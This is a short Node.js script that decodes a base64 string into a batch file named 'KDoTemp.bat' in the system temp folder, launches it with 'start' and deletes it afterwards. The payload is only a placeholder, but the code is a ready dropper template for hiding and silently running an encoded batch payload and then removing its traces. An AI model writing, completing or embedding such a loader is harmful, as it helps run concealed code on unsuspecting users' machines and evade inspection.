const fs = require('fs');
const os = require('os');
const path = require('path');
const exec = require('child_process').exec;

function main() {
    var tempDir = path.join(os.tmpdir(), "KDoTemp.bat");
    var b64stuff = "BASE64ENCODEDSTUFFHERE";
    var decoded = Buffer.from(b64stuff, 'base64').toString('ascii');
    fs.writeFileSync(tempDir, decoded);
    exec("start " + tempDir, function (err, stdout, stderr) {
        if (err) {
            console.log(err);
        }
        fs.unlinkSync(tempDir);
    });
}

main();
